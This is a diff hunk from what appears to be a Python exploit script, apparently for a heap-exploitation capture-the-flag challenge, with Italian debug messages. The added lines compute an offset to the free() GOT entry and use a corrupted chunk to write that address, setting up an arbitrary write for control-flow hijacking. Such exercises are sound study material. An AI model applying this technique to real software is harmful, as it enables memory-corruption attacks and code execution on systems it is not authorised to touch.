@@ -61,3 +61,14 @@ input("wait")
 #input("malloc 1 fatta: wait")
 #malloc(0x600)
 #print("MALLOC FATTE")
+
+
+
+offset_free_got = 0x2e04
+
+input("wait before writing")
+write(c2, 0x8, p64(main_address+offset_free_got))
+
+print("stampa main address + offset_free_got:")
+print(hex(main_address+offset_free_got))
+print("Scrittura dell'indirizzo dell'arbitrary chunk fatta")
